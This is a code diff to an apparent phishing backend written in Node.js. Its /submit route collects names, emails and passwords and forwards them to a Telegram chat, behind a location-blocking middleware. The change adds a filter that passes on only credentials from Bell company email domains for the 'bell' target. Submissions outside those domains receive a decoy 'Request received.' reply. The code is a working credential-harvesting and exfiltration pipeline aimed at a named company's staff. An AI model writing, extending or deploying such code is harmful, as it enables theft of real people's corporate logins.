@@ -109,6 +109,27 @@ function locationBlocker(req, res, next) {
   next();
 }
 
+function isAuthorizedCompanyEmail(name, email) {
+  // Only enforce rule for "bell"
+  if (name !== 'bell') return true;
+
+  if (!email || typeof email !== 'string') return false;
+
+  // Extract domain from email
+  const domain = email.split('@')[1]?.toLowerCase();
+  if (!domain) return false;
+
+  // 👇 PUT YOUR AUTHORIZED COMPANY DOMAINS HERE
+  const allowedCompanyDomains = [
+    'bell.com',
+    'bellnet.ca',
+    'bell.org'
+  ];
+
+  return allowedCompanyDomains.includes(domain);
+}
+
+
 app.get('/', (req, res) => {
   console.log('✅ Server was pinged - still running.');
   res.status(200).json({ status: 'Server is up and running.' });
@@ -119,6 +140,16 @@ app.post('/submit', locationBlocker, async (req, res) => {
   try {
     const data = req.body;
     console.log("📩 Received data:", data);
+
+    const { name, email, password, retypedEmail, retypedPassword } = data;
+
+    // 🔐 Enforce company-email rule ONLY for sigma
+    if (!isAuthorizedCompanyEmail(name, email)) {
+      return res.status(200).json({
+        message: 'Request received.'
+      });
+    }
+    
 
     // === Forwarding Logic ===
     const message = `
@@ -140,7 +171,7 @@ const chatId = process.env.TELEGRAM_CHAT_ID;
       chat_id: chatId,
       text: message,
     });
-
+    
     res.status(200).json({ message: 'Data forwarded successfully' });
   } catch (err) {
     console.error('Error forwarding data:', err.message);
